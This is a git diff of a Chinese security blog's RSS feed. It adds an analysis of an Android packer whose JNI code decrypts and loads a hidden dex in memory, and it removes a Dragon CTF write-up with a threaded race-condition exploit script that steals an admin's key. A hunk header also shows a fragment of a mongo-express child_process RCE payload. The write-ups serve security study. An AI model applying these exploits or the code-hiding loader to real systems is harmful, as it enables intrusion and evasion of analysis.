+    env-&amp;gt;SetObjectField(mApplicationInfo, classNameField, originApplicationName);
+    LOGE(&amp;quot;replace ApplicationInfo&#39;s className&amp;quot;);
+    //创建新的Application
+    jmethodID makeApplication = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(info), &amp;quot;makeApplication&amp;quot;, &amp;quot;(ZLandroid/app/Instrumentation;)Landroid/app/Application;&amp;quot;);
+    //这里调用原始app的attacheBaseContext
+    jobject originApp = env-&amp;gt;CallObjectMethod(info, makeApplication, false, NULL);
+    LOGE(&amp;quot;create new Application&amp;quot;);
+    //将句柄赋值到mInitialApplicationField
+    env-&amp;gt;SetObjectField(activityThread, mInitialApplicationField, originApp);
+    LOGE(&amp;quot;set object mInitialApplicationField&amp;quot;);
+    jfieldID mProviderMapField;
+    if (g_sdk_int &amp;lt; 19)
+    {
+        mProviderMapField = env-&amp;gt;GetFieldID(ActivityThreadClass, &amp;quot;mProviderMap&amp;quot;, &amp;quot;Ljava/util/HashMap;&amp;quot;);
+    }
+    else
+    {
+        mProviderMapField = env-&amp;gt;GetFieldID(ActivityThreadClass, &amp;quot;mProviderMap&amp;quot;, &amp;quot;Landroid/util/ArrayMap;&amp;quot;);
+    }
+    if (mProviderMapField == NULL)
+    {
+        LOGE(&amp;quot;not found mProviderMapField&amp;quot;);
+        return;
+    }
+    LOGE(&amp;quot;found mProviderMapField&amp;quot;);
+    jobject mProviderMap = env-&amp;gt;GetObjectField(activityThread, mProviderMapField);
+    LOGE(&amp;quot;found mProviderMap&amp;quot;);
+    jmethodID values = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(mProviderMap), &amp;quot;values&amp;quot;, &amp;quot;()Ljava/util/Collection;&amp;quot;);
+    jobject collections = env-&amp;gt;CallObjectMethod(mProviderMap, values);
+    jmethodID iterator = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(collections), &amp;quot;iterator&amp;quot;, &amp;quot;()Ljava/util/Iterator;&amp;quot;);
+    jobject mIterator = env-&amp;gt;CallObjectMethod(collections, iterator);
+    jmethodID hasNext = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(mIterator), &amp;quot;hasNext&amp;quot;, &amp;quot;()Z&amp;quot;);
+    jmethodID next = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(mIterator), &amp;quot;next&amp;quot;, &amp;quot;()Ljava/lang/Object;&amp;quot;);
+
+    //替换所有ContentProvider中的Context
+    LOGE(&amp;quot;ready replace all ContentProvider&#39;s context&amp;quot;);
+    while (env-&amp;gt;CallBooleanMethod(mIterator, hasNext))
+    {
+        jobject providerClientRecord = env-&amp;gt;CallObjectMethod(mIterator, next);
+        if (providerClientRecord == NULL)
+        {
+            LOGE(&amp;quot;providerClientRecord = NULL&amp;quot;);
+            continue;
+        }
+        jclass ProviderClientRecordClass = env-&amp;gt;FindClass(&amp;quot;android/app/ActivityThread$ProviderClientRecord&amp;quot;);
+        jfieldID mLocalProviderField = env-&amp;gt;GetFieldID(ProviderClientRecordClass, &amp;quot;mLocalProvider&amp;quot;, &amp;quot;Landroid/content/ContentProvider;&amp;quot;);
+        if (mLocalProviderField == NULL)
+        {
+            LOGE(&amp;quot;mLocalProviderField not found&amp;quot;);
+            continue;
+        }
+        jobject mLocalProvider = env-&amp;gt;GetObjectField(providerClientRecord, mLocalProviderField);
+        if (mLocalProvider == NULL)
+        {
+            LOGE(&amp;quot;mLocalProvider is NULL&amp;quot;);
+            continue;
+        }
+        jfieldID mContextField = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(mLocalProvider), &amp;quot;mContext&amp;quot;, &amp;quot;Landroid/content/Context;&amp;quot;);
+        if (mContextField == NULL)
+        {
+            LOGE(&amp;quot;mContextField not found&amp;quot;);
+            continue;
+        }
+        env-&amp;gt;SetObjectField(mLocalProvider, mContextField, originApp);
+    }
+
+    //执行originApp的onCreate
+    jmethodID onCreate = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(originApp), &amp;quot;onCreate&amp;quot;, &amp;quot;()V&amp;quot;);
+    env-&amp;gt;CallVoidMethod(originApp, onCreate);
+    LOGD(&amp;quot;Packer is done&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;onCreate 函数的流程大致如下：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;调用 ActivityThread 中 LoadedApk 对象的 makeApplication 方法来创建原始 Dex 文件的 Application 对象&lt;/li&gt;
+&lt;li&gt;替换 ActivityThread 中 mBoundApplication 的 mApplication 属性为原始 Dex 文件的 Application 对象&lt;/li&gt;
+&lt;li&gt;替换 ActivityThread 中的 mInitialApplication 属性为原始 Dex 文件的 Application 对象&lt;/li&gt;
+&lt;li&gt;替换 ActivityThread 中 LoadedApk 的 className 为原始 Dex 文件的 Application的name&lt;/li&gt;
+&lt;li&gt;替换 ActivityThread 中 mBoundApplication 里 appInfo 的 className 为原始 Dex 文件的 Application 的 name 属性&lt;/li&gt;
+&lt;li&gt;替换 ActivityThread 中 mProviderMap 中每个 provider 的 mContext 为原始 Dex 文件的 Application 对象&lt;/li&gt;
+&lt;li&gt;调用原始 Dex 文件的 Application 对象的 onCreate 方法，恢复原始 Dex 文件的组件启动&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;该函数的加载流程主要完成的是替换的过程，在这一点上和内存落地式没有差异，至于为何要完成替换以及如何理解相应流程，可以查看该篇博文：&lt;a href=&#34;https://www.jianshu.com/p/3ef82ac4bf4f&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Android动态替换Application实现&lt;/a&gt;，所以关键函数还是在于 &lt;code&gt;extract_file&lt;/code&gt; 和 &lt;code&gt;mem_loadDex&lt;/code&gt;，下面继续来看以下两个函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;extract_file&lt;/code&gt; 定义在 &lt;a href=&#34;https://github.com/woxihuannisja/Bangcle/blob/master/jni/utils.cpp，可以看到逻辑非常简单，从&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/woxihuannisja/Bangcle/blob/master/jni/utils.cpp，可以看到逻辑非常简单，从&lt;/a&gt; Assets 中提取相应文件并保存到一定目录下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int extract_file(JNIEnv *env, jobject ctx, const char *szDexPath, const char *fileName)
+{
+    if (access(szDexPath, F_OK) == 0)
+    {
+        LOGD(&amp;quot;[+]File %s have existed&amp;quot;, szDexPath);
+        return 0;
+    }
+    // jiami.dat不存在，开始提取
+    else
+    {
+        AAssetManager *mgr;
+        jclass ApplicationClass = env-&amp;gt;GetObjectClass(ctx);
+        jmethodID getAssets =
+            env-&amp;gt;GetMethodID(ApplicationClass, &amp;quot;getAssets&amp;quot;, &amp;quot;()Landroid/content/res/AssetManager;&amp;quot;);
+        jobject Assets_obj = env-&amp;gt;CallObjectMethod(ctx, getAssets);
+        mgr = AAssetManager_fromJava(env, Assets_obj);
+        if (mgr == NULL)
+        {
+            LOGE(&amp;quot;[-]getAAssetManager failed&amp;quot;);
+            return 0;
+        }
+        AAsset *asset = AAssetManager_open(mgr, fileName, AASSET_MODE_STREAMING);
+        FILE *file = fopen(szDexPath, &amp;quot;wb&amp;quot;);
+        int bufferSize = AAsset_getLength(asset);
+        LOGD(&amp;quot;[+]Asset FileName:%s,extract path:%s,size:%d\n&amp;quot;, fileName, szDexPath, bufferSize);
+        void *buffer = malloc(4096);
+        while (true)
+        {
+            int numBytesRead = AAsset_read(asset, buffer, 4096);
+            if (numBytesRead &amp;lt;= 0)
+            {
+                break;
+            }
+            fwrite(buffer, numBytesRead, 1, file);
+        }
+        free(buffer);
+        fclose(file);
+        AAsset_close(asset);
+        chmod(szDexPath, 493);
+    }
+} // extract_file
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么看来最核心的逻辑在于 &lt;code&gt;mem_loadDex&lt;/code&gt; 函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void mem_loadDex(JNIEnv *env, jobject ctx, const char *dex_path)
+{
+    char inPath[256] = {0};
+    char outPath[256] = {0};
+    jobject mini_dex_obj = NULL;
+    void *c_dex_cookie = NULL;
+
+    jclass ApplicationClass = env-&amp;gt;GetObjectClass(ctx);
+    jmethodID getClassLoader = env-&amp;gt;GetMethodID(ApplicationClass, &amp;quot;getClassLoader&amp;quot;, &amp;quot;()Ljava/lang/ClassLoader;&amp;quot;);
+    jobject classLoader = env-&amp;gt;CallObjectMethod(ctx, getClassLoader);
+
+    char szDexPath[256] = {0};
+
+    sprintf((char *)szDexPath, dex_path, strlen(dex_path));
+    LOGD(&amp;quot;[+]Dex Path:%s&amp;quot;, szDexPath);
+    //读取加密dex
+    int encrypt_size;
+    char *encrypt_buffer = parse_file(szDexPath, encrypt_size);
+    //check dex size
+    if (!encrypt_size)
+    {
+        LOGE(&amp;quot;[-]encrypt_size is 0&amp;quot;);
+        exit(-1);
+    }
+    else if (encrypt_size % 16)
+    {
+        LOGE(&amp;quot;[-]encrypt_size is not mutiple 16&amp;quot;);
+        exit(-1);
+    }
+
+    int zero = open(&amp;quot;/dev/zero&amp;quot;, PROT_WRITE);
+    g_decrypt_base = mmap(0, encrypt_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, zero, 0);
+    close(zero);
+    if (g_decrypt_base == MAP_FAILED)
+    {
+        LOGE(&amp;quot;[-]ANONYMOUS mmap failed:%s&amp;quot;, strerror(errno));
+        exit(-1);
+    }
+    //LOGD(&amp;quot;[+]ANONYMOUS mmap addr:%p&amp;quot;, g_decrypt_base);
+    char decrypt_path[256] = {0};
+    sprintf((char *)decrypt_path, &amp;quot;%s/decrypt.dat&amp;quot;, g_jiagu_dir);
+    //char *decrypt_buffer = aes_decrypt_cbc(encrypt_buffer, encrypt_size, &amp;amp;g_dex_size);
+    char *decrypt_buffer = tiny_aes_decrypt_cbc(encrypt_buffer, encrypt_size, &amp;amp;g_dex_size);
+    if (!decrypt_buffer)
+    {
+        LOGE(&amp;quot;[-]aes_decrypt_cbc decrypt dex failed&amp;quot;);
+        exit(-1);
+    }
+
+    memcpy(g_decrypt_base, decrypt_buffer, g_dex_size);
+    g_page_size = PAGE_END(g_dex_size);
+    free(decrypt_buffer);
+
+    LOGD(&amp;quot;[+]After decrypt dex magic:0x%x,size:%d,page_size:%d&amp;quot;, *(int *)g_decrypt_base, g_dex_size, g_page_size);
+
+    if (!g_isArt)
+    {
+        jint mCookie = mem_loadDex_dvm(env, (char *)szDexPath);
+        LOGD(&amp;quot;[+]Dalvik dex cookie :0x%x&amp;quot;, mCookie);
+        jclass DexFileClass = env-&amp;gt;FindClass(&amp;quot;dalvik/system/DexFile&amp;quot;);
+        jfieldID cookie_field = env-&amp;gt;GetFieldID(DexFileClass, &amp;quot;mCookie&amp;quot;, &amp;quot;I&amp;quot;);
+        //replace cookie
+        env-&amp;gt;SetIntField(mini_dex_obj, cookie_field, mCookie);
+        make_dex_elements(env, classLoader, mini_dex_obj);
+        return;
+    }
+    else
+    {
+        sprintf(inPath, &amp;quot;%s/mini.dex&amp;quot;, g_jiagu_dir);
+        sprintf(outPath, &amp;quot;%s/mini.oat&amp;quot;, g_jiagu_dir);
+        write_mix_dex(inPath);
+        g_ArtHandle = get_lib_handle(LIB_ART_PATH);
+        if (g_ArtHandle)
+        {
+            c_dex_cookie = openmemory_load_dex(g_ArtHandle, (char *)g_decrypt_base, (size_t)g_dex_size, g_sdk_int);
+            LOGD(&amp;quot;[+]sdk_int :%d,c_dex_cookie:%p&amp;quot;, g_sdk_int, c_dex_cookie);
+            if (c_dex_cookie)
+            {
+                // 加载mini.dex
+                mini_dex_obj = load_dex_fromfile(env, inPath, outPath);
+                replace_cookie(env, mini_dex_obj, c_dex_cookie, g_sdk_int);
+                make_dex_elements(env, classLoader, mini_dex_obj);
+                LOGD(&amp;quot;[+]using fast plan load dex finished&amp;quot;);
+            }
+            else
+            {
+                // 执行方案二
+                LOGD(&amp;quot;[-]get c_dex_cookie failed! Try second plan&amp;quot;);
+                goto label;
+            }
+        }
+        else
+        {
+            LOGD(&amp;quot;[-]get art handle failed! Try second plan&amp;quot;);
+        label:
+            // get_path_frommaps(g_pkgName, (char *)g_fake_dex_path, (char *)&amp;quot;.dex&amp;quot;, (char *)&amp;quot;.odex&amp;quot;);
+            // pkgName
+            sprintf((char*)g_fake_dex_magic,&amp;quot;%s/mini.dex&amp;quot;,PACKER_MAGIC);
+            LOGD(&amp;quot;[+]g_faked_dex_magic:%s&amp;quot;,(char*)g_fake_dex_magic);
+            // 加载fake_dex
+            mini_dex_obj = hook_load_dex_internally(env, (const char *)LIB_ART_PATH, (char *)inPath, outPath);
+            
+            make_dex_elements(env, classLoader, mini_dex_obj);
+            LOGD(&amp;quot;[+]using second plan load dex finished&amp;quot;);
+        }
+
+        if (g_ArtHandle)
+        {
+            dlclose(g_ArtHandle);
+        }
+        return;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到这段代码也比较长，但总的来说可以分成以下几个步骤：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;读取加密文件并在内存中解密，存入一个 buffer 中&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;根据虚拟机版本（art / dvm）进入不同逻辑&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;dvm 的逻辑参考作者文章 &lt;a href=&#34;https://bbs.pediy.com/thread-215078.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;阿里早期加固代码还原4.4-6.0&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;用mmap将dex映射内存，使用openDexFile加载dex，就会得到cookie，然后用这个cookie设置Application类中的某些成员&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;这里主要还是使用的是 dvm 虚拟机自带的 &lt;code&gt;Dalvik_dalvik_system_DexFile_openDexFile_bytearray&lt;/code&gt; 函数来实现加载字节码，可以继续参考文章 &lt;a href=&#34;https://paper.seebug.org/59/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;对抗静态分析——dex不落地加载&lt;/a&gt;。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Art 的逻辑参考作者的另一篇文章 &lt;a href=&#34;https://bbs.pediy.com/thread-225303.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Android第二代加固（support 4.4-8.1）&lt;/a&gt;：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Art 下提供了2种方案，
+方案一是 call libart下的OpenMemory函数，如何将java的mCookie和c层的cookie联系起来是一个难点，
+方案二是 使用elf Hook来实现 ，由于在Nougat+上dlsym openMemory失败，还有dex_location和dex_cache_location的路径检查，使用方案一有些问题&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;调用 make_dex_elements 函数，作用大致上就是模拟 DexClassLoader 加载过程中对 DexPathList 对象的 dexElements 进行赋值，将部分的 Java 逻辑用 JNI 实现。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;写完之后才感觉总结的并不恰当，花了很多时间和片段在分析代码逻辑上，导致最后读起来非常冗长，但既然已经写了这么多最后还是不舍得删了233。&lt;/p&gt;
+
+&lt;p&gt;写归纳性的博客还是需要更多的归纳代码的思想和要点。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;[http://zjutkz.net/2018/01/25/InMemoryDexClassLoader%E6%BA%90%E7%A0%81%E6%8E%A2%E7%A9%B6/](http://zjutkz.net/2018/01/25/InMemoryDexClassLoader源码探究/)&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;InMemoryDexClassLoader探究&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-225303.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Android第二代加固（support 4.4-8.1）&lt;/a&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-215078.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;阿里早期加固代码还原4.4-6.0&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/5820&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;深入理解Apk加固之Dex保护&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>CVE-2019-10758 mongo-express RCE 漏洞分析</title>
@@ -237,10 +1067,10 @@ process.mainModule.require(&amp;quot;child_process&amp;quot;).execSync(&amp;quot
     
     <item>
       <title>Java及Android类加载机制学习笔记</title>
-      <link>https://syang-ng.github.io/2020/01/java%E5%8F%8Aandroid%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
+      <link>https://syang-ng.github.io/2020/01/classloader-of-java-and-android/</link>
       <pubDate>Fri, 03 Jan 2020 18:26:07 +0800</pubDate>
       
-      <guid>https://syang-ng.github.io/2020/01/java%E5%8F%8Aandroid%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
+      <guid>https://syang-ng.github.io/2020/01/classloader-of-java-and-android/</guid>
       <description>
 
 &lt;p&gt;Java 类加载和 Android 上类加载相关的学习笔记，大部分文字来自《深入理解 Java 虚拟机》，部分来自网上博文（我不生产知识，我只是知识的搬运工 XD）&lt;/p&gt;
@@ -1927,7 +2757,7 @@ print_r(hmac($obj, $secret));
 
 &lt;p&gt;Sen Yang&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&#34;http://fudan.edu.cn/2016/index.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Fudan University&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.fudan.edu.cn&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Fudan University&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2 id=&#34;ctf&#34;&gt;CTF&lt;/h2&gt;
 
@@ -3991,356 +4821,6 @@ if __name__ == &#39;__main__&#39;:
 &lt;li&gt;&lt;a href=&#34;http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;GhostScript命令执行漏洞&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://graneed.hatenablog.com/entry/2018/10/28/150722&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;GhostKingdom writeup by noraneco&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/PDKT-Team/ctf/tree/master/seccon2018/shooter&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;shooter writeup by PDKT&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Dragon CTF Web 部分 Writeup</title>
-      <link>https://syang-ng.github.io/2018/09/dragonctf-web-writeup/</link>
-      <pubDate>Sun, 30 Sep 2018 20:01:34 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2018/09/dragonctf-web-writeup/</guid>
-      <description>
-
-&lt;h2 id=&#34;3nterprise-s0lution&#34;&gt;3NTERPRISE s0lution&lt;/h2&gt;
-
-&lt;p&gt;题目直接给出了源码，我已经贴在了 gist 上：&lt;a href=&#34;https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;下面来看题目，进来之后是个很明显的 &lt;code&gt;登录&lt;/code&gt;/&lt;code&gt;注册&lt;/code&gt; 界面，审计完代码后确认题目利用点应该不是此处，那随意注册个名字登录即可：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view1.png&#34; alt=&#34;view 1&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;进入后我们可以看到题目提供的功能，主要有以下两项：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;发布一个 note&lt;/li&gt;
-&lt;li&gt;查看发布的 note&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view2.png&#34; alt=&#34;view 2&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;发布的 note 会被自动分配一个 id，那很自然的想到尝试访问 id 为 1 的页面：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view3.png&#34; alt=&#34;view 3&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到该页面是由 admin 发布的，但显示的是一段密文，然后页面会进行解密（并得到错误的结果）&lt;/p&gt;
-
-&lt;p&gt;查看页面源代码，可以发现执行的是异或加密的解密过程，页面会从 &lt;a href=&#34;http://solution.hackable.software:8080/note/getkey&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://solution.hackable.software:8080/note/getkey&lt;/a&gt; 处请求对应的密钥&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;textarea rows=20 cols=40 id=&amp;quot;note_data&amp;quot;&amp;gt;07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;
-&amp;lt;div id=&amp;quot;konsole&amp;quot;&amp;gt;
-  Note encrypted ... &amp;lt;br&amp;gt;
-&amp;lt;/div&amp;gt;
-&amp;lt;script&amp;gt;
-  var org_content = &#39;&#39;;
-  var pos = 0;
-  function ll(msg){ jQuery(&amp;quot;#konsole&amp;quot;).append(&amp;quot;[+] &amp;quot; + msg + &amp;quot;&amp;lt;br&amp;gt;&amp;quot;); }
-  window.setTimeout(function(){ fetch_key() }, 1000)
-  function fetch_key(){
-    ll(&amp;quot;getting key ... &amp;quot;);
-    jQuery.get(
-      &amp;quot;/note/getkey&amp;quot;, 
-      function(data){
-        ll(&amp;quot;got key ...&amp;quot;);
-        window.setTimeout(function(){ decode(data.key); }, 1000)
-      }
-    )
-  }
-
-  function hex_to_ascii(str1){
-    var hex  = str1.toString();
-    var str = &#39;&#39;;
-    for (var n = 0; n &amp;lt; hex.length; n += 2) {
-      str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
-    }
-    return str;
-  }
-
-  function decode(key){
-    ll(&amp;quot;decoding ... &amp;quot;);
-    var note = jQuery(&amp;quot;#note_data&amp;quot;)
-    window.hex_content = note.val();
-    window.pos = 0;
-    window.org_content = hex_to_ascii(window.hex_content);
-    window.key_content = hex_to_ascii(key);
-    window.key_len = key.length;
-    window.plaintext = &#39;&#39;;
-    note.val(&#39;&#39;);
-    decode_iter();
-  }
-  function decode_iter(){
-    var note = jQuery(&amp;quot;#note_data&amp;quot;);
-    if (window.pos &amp;gt;= window.org_content.length){
-      return ll(&amp;quot;Done !&amp;quot;);
-    }
-    c1 = window.org_content.charCodeAt(pos);
-    c2 = window.key_content.charCodeAt(pos % window.key_len);
-    c3 = c1 ^ c2;
-    // console.log(c1 + &amp;quot; xor &amp;quot;+ c2 + &amp;quot; = &amp;quot;+ c3); // no loggin on prod !
-    window.plaintext += String.fromCharCode(c3)
-    note.val(window.plaintext + window.hex_content.slice(2+pos*2));
-    window.pos += 1
-    window.setTimeout(function(){decode_iter();}, 120);
-  }
-&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这里就解答了我们之前的疑惑，为什么解密的结果是错误的？因为 admin 的密文是用他的密钥加密的，而直接访问该链接只能得到我们直接的密钥，所以解密的结果必然出错。那么我们现在的目的很明确，获得 admin 用户的加密密钥。&lt;/p&gt;
-
-&lt;p&gt;从源码中，我们可以看到有两种途径来获得 key，第一种是直接调用 &lt;code&gt;/note/getkey&lt;/code&gt;，第二种方式则较为间接，我们调用 &lt;code&gt;note/add&lt;/code&gt;，然后发送一大段内容为 &lt;code&gt;\x00&lt;/code&gt; 的文本，由于异或加密的性质，加密后的密文即加密使用的密钥&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@app.route(&amp;quot;/note/getkey&amp;quot;)
-@loginzone
-def do_note_getkey():
-  return flask.jsonify(dict(
-    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))
-  ))
-
-@app.route(&amp;quot;/note/add&amp;quot;, methods=[&#39;POST&#39;])
-@loginzone
-def do_note_add_post():
-  text = get_required_params(&amp;quot;POST&amp;quot;, [&amp;quot;text&amp;quot;])[&amp;quot;text&amp;quot;]
-  key = backend.cache_load(flask.session.sid)
-  if key is None:
-    raise WebException(&amp;quot;Cached key&amp;quot;)
-  text = backend.xor_1337_encrypt(
-    data=text,
-    key=key,
-  )
-  note = model.Notes(
-    username=flask.session[K_LOGGED_USER],
-    message=backend.hex_encode(text),
-  )
-  sql_session.add(note)
-  sql_session.commit()
-  add_msg(&amp;quot;Done !&amp;quot;)
-  return do_render()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;虽然第一种方式更为直接，但后来的测试表明，本题有个很明显的坑在于 key 的长度不止 20 bytes，所以我们必须使用第二种方式来获得 key。&lt;/p&gt;
-
-&lt;p&gt;下一步需要思考如何修改加密的密钥，可以看到程序代码中获得密钥的操作是 &lt;code&gt;backend.cache_load&lt;/code&gt;，而在程序中恰好有另一个函数可以修改 cache：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@app.route(&#39;/login/user&#39;, methods=[&#39;POST&#39;])
-def do_login_user_post():
-  username = get_required_params(&amp;quot;POST&amp;quot;, [&#39;login&#39;])[&#39;login&#39;]
-  backend.cache_save(
-    sid=flask.session.sid,
-    value=backend.get_key_for_user(username)
-  )
-  state = backend.check_user_state(username)
-  if state &amp;gt; 0:
-    add_msg(&amp;quot;user has {} state code ;/ contact backend admin ... &amp;quot;.format(state))
-    return do_render()
-  flask.session[K_LOGGED_IN] = False
-  flask.session[K_AUTH_USER] = username
-
-  return do_302(&amp;quot;/login/auth&amp;quot;)
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以发现我们可以通过传入 &lt;code&gt;login:admin&lt;/code&gt; 的方式将 cache 缓存的密钥修改为 admin 所持有的密钥，然后程序从缓存中读取该密钥进而加密内容，我们就能非常顺利的获得密钥了。但在正常情况下先后调用两个函数是不可能的，因为 &lt;code&gt;do_login_user_post&lt;/code&gt; 会取消用户的登录状态，所以这里就需要利用竞争。&lt;/p&gt;
-
-&lt;p&gt;既然我们清楚这道题的考点是条件竞争，那么写代码就是相当容易的一件事情了：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
-import threading
-
-s = requests.Session()
-
-def user_login(name):
-    s.post(&#39;http://solution.hackable.software:8080/login/user&#39;, data={&#39;login&#39;:name})
-
-def user_auth(password, token):
-    s.post(&#39;http://solution.hackable.software:8080/login/auth&#39;, data={&#39;password&#39;:password, &#39;token&#39;: token})
-
-def add_note():
-    text = chr(0x00)*160
-    s.post(&#39;http://solution.hackable.software:8080/note/add&#39;,{&#39;text&#39;:text})
-
-def main():
-    while True:
-        user_login(&#39;exec&#39;)
-        user_auth(&#39;exec&#39;, &#39;exec&#39;)
-        t1 = threading.Thread(target=user_login, args=(&#39;admin&#39;,))
-        t2 = threading.Thread(target=add_note)
-        t1.start()
-        t2.start()
-
-if __name__ == &#39;__main__&#39;:
-    main()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view4.png&#34; alt=&#34;view 4&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;成功获得 admin 的密钥：&lt;code&gt;4FB198AC92B2D1EEACAF6242E9BB811DEF7A2A73F9D6440BC27B5D7D7F2A3C3B83E0F7DEE9762A7A912084E81FF57BC22E212AC3EADBC04B24130EDC0BAE24792C88B6C131FB3A018AC7CEA72ECE0DBAB246616148ECAA227C6D5DCDDE98D891D7799B3A&lt;/code&gt;，结合密文解密得到 flag：&lt;/p&gt;
-
